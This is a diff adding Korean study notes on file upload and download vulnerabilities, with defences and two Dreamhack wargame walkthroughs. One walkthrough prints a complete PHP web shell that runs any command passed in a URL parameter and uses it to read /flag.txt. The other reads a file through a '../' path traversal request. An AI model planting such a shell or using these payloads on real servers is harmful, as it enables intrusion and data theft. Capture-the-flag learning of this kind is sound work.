@@ -827,8 +827,95 @@ def ping():
 ![command-injection-7](images/Pasted%20image%2020230829203727.png)
 - 플래그 획득
 
-
 ## File Vulnerability
+
+유저가 업로드한 파일을 서버에 저장하는 경우 악성 파일을 올려 취약점을 발생시킴
+- 업로드 취약점: 파일 시스템 상 임의 경로에 원하는 파일을 업로드할 수 있을 때 발생. 시스템 커맨드를 실행하는 원격 코드 실행
+- 다운로드 취약점: 웹 서비스의 파일 시스템에 존재하는 임의 파일을 다운로드 받을 수 있을 때 발생. 민감한 정보를 탈취할 수 있고 2차 공격을 수행할 수 있음
+
+### 파일 업로드 취약점(File Upload Vulnerability)
+
+유저가 업로드될 파일의 이름을 임의로 정할 수 있을 때 발생함
+
+1. Path Traversal: 임의 디렉터리에 파일을 업로드할 수 있는 취약점
+	- 특정 디렉토리에만 업로드를 허용. 
+	- 제약이 없는 경우 취약점 발생
+		- `.`, `..` 같은 메타 문자로 임의 디렉토리에 업로드 가능
+2. 악성 파일 업로드
+	- 이용자가 파일을 업로드할 때 검사하지 않아서 발생하는 취약점
+	- 웹쉘이나 웹 리소스를 업로드함
+	- 웹쉘: php 파일 내부에서 시스템 커맨드 입력 가능하도록만든 파일 
+	- 웹리소스: Stored Xss
+
+방어
+- 업로드 디렉토리를 직접 접근할수 없도록 설정
+- 업로드 디렉토리에서 CGI가 실행되지 않도록 설정
+- 업로드된 파일 이름을 검증후 사용
+- 허용할 확장자만 업로드 되도록 설정
+
+### 파일 다운로드 취약점(File Download Vulnerability)
+
+유저가 다운로드할 파일이름을 정할수 있을 떄 발생
+1. Path Traversal
+
+방어
+- 다운로드 요청 파일 이름 검증
+- 파일 이름과 1:1 매핑되는 키 생성후 이름 대신 키 사용
+
+### wargame
+
+**image-storage**
+php로 작성된 파일 저장 서비스입니다.
+파일 업로드 취약점을 이용해 플래그를 획득하세요. 플래그는 `/flag.txt`에 있습니다.
+
+
+취약점 분석 / 파일 다운로드후 확인
+- 임의 파일 업로드 가능
+
+![File-Vulnerability-1](images/Pasted%20image%2020230829213419.png)
+- upload 페이지 접속
+
+```php  
+
+<html><body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form><pre>
+<?php
+if(isset($_GET['cmd']))
+{
+	system($_GET['cmd']);
+}
+?></pre></body></html>
+```
+- 해당 소스코드로 만든 php 파일 업로드
+
+![File-Vulnerability-2](images/Pasted%20image%2020230829213620.png)
+- 업로드 파일 경로 접속후 명령어 입력
+- `cat /flag.txt`
+
+![File-Vulnerability-3](images/Pasted%20image%2020230829213706.png)
+- 플래그 획득
+
+**file-download-1**
+
+File Download 취약점이 존재하는 웹 서비스입니다.  
+flag.py를 다운로드 받으면 플래그를 획득할 수 있습니다.
+
+취약점 분석
+- 업로드 페이지는 막혀있음
+	- content에 스크립트 작성해도 encode로 막혀있어서 실행불가능
+	- `..` 이라는 메타문자도 필터링 되어있음
+- 다운로드 페이지는 막혀있지 않음(취약점)
+	- 아무 파일 업로드후 url을 확인해보면 다음과 같음
+	- `http://host3.dreamhack.games:21974/read?name=a.html`
+	- 쿼리에 필터링 값없음: `..`/을 넣어도 입력 가능
+	- 여러 위치 확인
+	- `?name=flag.py`
+	- `?name=../flag.py`
+![file-download-1](images/Pasted%20image%2020230829214914.png)
+- 플래그 획득
 
 ## SSRF - Server Side Request Forgery 
 
